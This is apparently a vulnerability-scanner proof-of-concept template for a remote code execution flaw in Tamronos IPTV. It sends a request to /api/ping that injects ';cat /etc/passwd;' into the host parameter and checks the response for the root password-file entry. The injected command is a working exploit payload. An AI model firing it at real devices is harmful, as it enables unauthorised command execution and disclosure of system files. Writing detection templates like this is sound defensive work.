id: poc-yaml-tamronos-iptv-rce
info:
  name: Tamronos Iptv 远程代码执行漏洞
  severity: medium
  tags:
  - rce
  finger: Tamronos Iptv
  reference: []
  description: null
variables:
  r1: random_int(10000, 21000)
  r2: random_int(10000, 21000)
transport: http
requests:
- method: GET
  path: /api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && matches(body,`root:.*:0:0:`) && contains(body,"/bin")
  output: []
